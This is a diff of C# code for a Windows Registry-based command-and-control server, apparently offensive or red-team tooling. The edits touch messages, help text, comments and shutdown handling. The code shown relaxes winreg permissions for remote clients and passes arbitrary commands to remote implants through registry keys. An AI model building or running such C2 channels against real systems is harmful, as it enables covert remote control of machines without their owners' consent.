@@ -25,7 +25,7 @@ namespace RegC2Server
                 Console.WriteLine(ex.Message);
                 return;
             }
-            Console.WriteLine("Cmd updated to: {0}", myReg.GetValue("cmd"));
+            Console.WriteLine("[*]Cmd updated to: {0}", myReg.GetValue("cmd"));
 
             //Read output when available
             myReg.SetValue("output", "");
@@ -49,7 +49,7 @@ namespace RegC2Server
 
             if (!isInt)
             {
-                Console.WriteLine("Please provide an int when using the sleep command");
+                Console.WriteLine("[!] Please provide an integer when using the sleep command");
                 return;
             }
             RegistryKey myReg;
@@ -63,7 +63,7 @@ namespace RegC2Server
                 Console.WriteLine(ex.Message);
                 return;
             }
-            Console.WriteLine("Sleep updated to: {0}", myReg.GetValue("sleep"));
+            Console.WriteLine("[+] Sleep updated to: {0}", myReg.GetValue("sleep"));
             myReg.Close();
 
         }
@@ -71,8 +71,8 @@ namespace RegC2Server
         static void PrintHelp()
         {
             Console.WriteLine(
-                "sleep 10         Sets the sleep time to 10\n" +
-                "cmd whoami       Executes whoami\n" +
+                "sleep <int>      Sets the sleep time to int given\n" +
+                "cmd <command>    Executes the value of command\n" +
                 "exit             Exits the application gracefully");
         }
 
@@ -131,7 +131,7 @@ namespace RegC2Server
                     key.Close();
                 } catch (Exception ex)
                 {
-                    Console.WriteLine("Failed... : " + ex.Message);
+                    Console.WriteLine("Failed... Closing down : " + ex.Message);
                     Environment.Exit(0);
                 }
                 Console.WriteLine("[+] Registry keys created... Setting up permissions");
@@ -192,17 +192,21 @@ namespace RegC2Server
             }
         }
 
-        public static void Shutdown(string registryKey)
+        public static void Shutdown(string registryKey, bool ctrlc)
         {
             Console.WriteLine("[+] Closing down...");
             ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", false);
             ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\" + registryKey, false);
-            //Environment.Exit(0);
+            if (!ctrlc)
+            {
+                Environment.Exit(0);
+            }
         }
 
         public static void Setup(string registryKey)
         {
             Console.WriteLine("[+] Welcome to RegC2");
+
             //Make sure the RemoteRegistryService is started...
             if (!StartRemoteRegistryService())
             {
@@ -211,10 +215,11 @@ namespace RegC2Server
                 Environment.Exit(0);
             }
 
-            //Setup the Windows Registry Keys to handle communication...
+            //Make sure the clients can connect by adding the correct permissions to "winreg"..
             Console.WriteLine("[+] Setting up permissions to WinReg...");
             ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", true);
 
+            //Make sure the client can read/write to the client specific registry key...
             Console.WriteLine("[+] Setting up Registry keys...");
             SetupRegistryKeys(registryKey);
         }
@@ -233,10 +238,10 @@ namespace RegC2Server
             //Catching Ctrl + C events to clean up correctly...
             Console.CancelKeyPress += delegate
             {
-                Shutdown(registryKey);
+                Shutdown(registryKey, true);
             };
 
-            //Run Setup function
+            //Setup all the requirements for the C2 server to work...
             Setup(registryKey);
 
             //C2 loop
@@ -261,7 +266,7 @@ namespace RegC2Server
                 }
 
                 if (cmd.StartsWith("exit", StringComparison.OrdinalIgnoreCase)) {
-                    Shutdown(registryKey);
+                    Shutdown(registryKey, false);
                 }
             }
 
